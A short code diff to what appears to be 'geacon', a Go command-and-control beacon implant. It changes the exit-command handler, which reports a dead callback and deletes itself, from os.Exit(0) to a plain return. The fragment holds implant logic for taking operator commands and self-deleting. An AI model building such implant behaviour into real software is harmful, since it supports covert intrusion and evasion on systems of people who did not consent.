@@ -8,7 +8,6 @@ import (
 	"main/sysinfo"
 	"main/util"
 	"math/rand"
-	"os"
 	"time"
 )
 
@@ -152,7 +151,7 @@ func main() {
 							case command.CMD_TYPE_EXIT:
 								packet.PushResult(packet.CALLBACK_DEAD, []byte("exit"))
 								command.DeleteSelf()
-								os.Exit(0)
+								return
 							default:
 								errMsg := util.Sprintf("command type %d is not support by geacon now", cmdType)
 								packet.ErrorMessage(errMsg)
